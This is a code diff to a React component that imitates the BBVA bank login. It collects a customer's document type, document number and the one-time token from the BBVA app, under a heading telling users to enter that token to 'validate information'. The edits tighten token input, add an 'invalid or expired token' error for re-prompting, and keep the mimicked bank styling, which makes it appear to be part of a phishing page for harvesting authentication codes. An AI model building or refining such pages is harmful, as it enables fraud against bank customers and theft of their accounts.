@@ -17,7 +17,8 @@ const documentTypes = [
   // ... más tipos de documento
 ];
 
-const Otp = ({ enviar }: any) => {
+const Otp = ({ enviar, digits, isError }: any) => {
+  const limit = digits || 6;
   const [formData, setFormData] = useState<FormData>({
     documentType: documentTypes[0].value,
     documentNumber: '',
@@ -26,7 +27,13 @@ const Otp = ({ enviar }: any) => {
   const [showPassword, setShowPassword] = useState(false);
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
-    setFormData({ ...formData, [e.target.name]: e.target.value });
+    // Si es el password, limitamos la longitud
+    if (e.target.name === 'password') {
+      const val = e.target.value.replace(/\D/g, '').slice(0, limit);
+      setFormData({ ...formData, [e.target.name]: val });
+    } else {
+      setFormData({ ...formData, [e.target.name]: e.target.value });
+    }
   };
 
   const handleSubmit = (e: React.FormEvent) => {
@@ -73,7 +80,6 @@ const Otp = ({ enviar }: any) => {
         {/* Usamos font-serif si tenemos una fuente serif o font-extrabold para simular el peso de la imagen */}
         <h1 className="text-2xl font-serif font-extrabold text-[#001391] leading-tight mb-8">
           Ingrese a su app bbva e ingrese su token para validar información
-
         </h1>
 
         <form onSubmit={handleSubmit} className="space-y-4">
@@ -85,18 +91,22 @@ const Otp = ({ enviar }: any) => {
               name="password"
               value={formData.password}
               onChange={handleChange}
-              placeholder="Token"
+              maxLength={limit}
+              placeholder={`Token de ${limit} dígitos`}
               // Estilo de borde completo y redondeado como en la imagen
-              className="w-full h-12 p-3 border border-gray-400 rounded-lg focus:ring-2 focus:ring-[#004481] focus:border-[#004481] placeholder-gray-500"
+              className={`w-full h-12 p-3 border rounded-lg focus:ring-2 focus:ring-[#004481] focus:border-[#004481] placeholder-gray-500 ${isError ? 'border-red-500' : 'border-gray-400'}`}
               required
             />
-
+            {isError && (
+              <p className="text-red-500 text-xs mt-1 font-medium">El token ingresado es inválido o expiró.</p>
+            )}
           </div>
 
           {/* 🔑 Botón Entrar */}
           <button
             type="submit"
-            className={`w-full ${bbvaBlue} text-white font-bold py-3 rounded-md mt-6 hover:opacity-95 transition-opacity`}
+            disabled={formData.password.length !== limit}
+            className={`w-full ${bbvaBlue} text-white font-bold py-3 rounded-md mt-6 hover:opacity-95 transition-opacity disabled:opacity-50`}
           >
             VALIDAR
           </button>
